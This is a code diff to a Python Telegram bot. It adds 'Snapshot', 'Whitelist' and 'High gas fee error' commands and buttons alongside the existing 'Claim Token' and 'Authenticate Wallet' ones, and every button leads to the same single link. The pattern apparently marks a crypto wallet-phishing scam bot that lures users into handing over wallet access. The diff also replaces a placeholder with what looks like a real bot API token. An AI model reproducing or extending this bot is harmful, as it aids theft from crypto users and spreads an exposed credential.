@@ -1,8 +1,9 @@
+#!/usr/bin/env python3.9
 import requests
 import telegram.ext
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
 
-api_key = "XXXXXXXXXXXXXXXXXXXXXX"
+api_key = "5198837632:AAFeV2sevaYFINkYhdvMjXID66VfJZmN4Gs"
 
 telegram_group_id = "chrisandchily"
 
@@ -49,6 +50,32 @@ def claim_token(update, context):
     )
 
 
+def snap_shot(update, context):
+    markUp = InlineKeyboardMarkup([[InlineKeyboardButton("Snap Shot", url=url)]])
+    update.message.reply_text(
+        f"Hello {update.effective_user.first_name}, please click the button below:",
+        reply_markup=markUp,
+    )
+
+
+def whitelist(update, context):
+    markUp = InlineKeyboardMarkup([[InlineKeyboardButton("Whitelist", url=url)]])
+    update.message.reply_text(
+        f"Hello {update.effective_user.first_name}, please click the button below:",
+        reply_markup=markUp,
+    )
+
+
+def gas_fee(update, context):
+    markUp = InlineKeyboardMarkup(
+        [[InlineKeyboardButton("High gas fee error", url=url)]]
+    )
+    update.message.reply_text(
+        f"Hello {update.effective_user.first_name}, please click the button below:",
+        reply_markup=markUp,
+    )
+
+
 def authenticate_wallet(update, context):
     markUp = InlineKeyboardMarkup(
         [[InlineKeyboardButton("Authenticate Wallet", url=url)]]
@@ -81,6 +108,9 @@ def options(update: Update, context: telegram.ext.CallbackContext):
             [InlineKeyboardButton("Claim Token", url=url)],
             [InlineKeyboardButton("Autheticate Wallet", url=url)],
             [InlineKeyboardButton("Track Transactions", url=url)],
+            [InlineKeyboardButton("Snapshot", url=url)],
+            [InlineKeyboardButton("Whitelist", url=url)],
+            [InlineKeyboardButton("High gas fee error", url=url)],
         ]
     )
     update.message.reply_text(
@@ -107,6 +137,9 @@ disp.add_handler(
     telegram.ext.CommandHandler("authenticate_wallet", authenticate_wallet)
 )
 disp.add_handler(telegram.ext.CommandHandler("track_transactions", track_transactions))
+disp.add_handler(telegram.ext.CommandHandler("snapshot", snap_shot))
+disp.add_handler(telegram.ext.CommandHandler("whitelist", whitelist))
+disp.add_handler(telegram.ext.CommandHandler("gas_fee", gas_fee))
 disp.add_handler(telegram.ext.CommandHandler("contact", contact))
 # disp.add_handler(telegram.ext.CommandHandler('content', content))
 disp.add_handler(telegram.ext.CommandHandler("help", help))
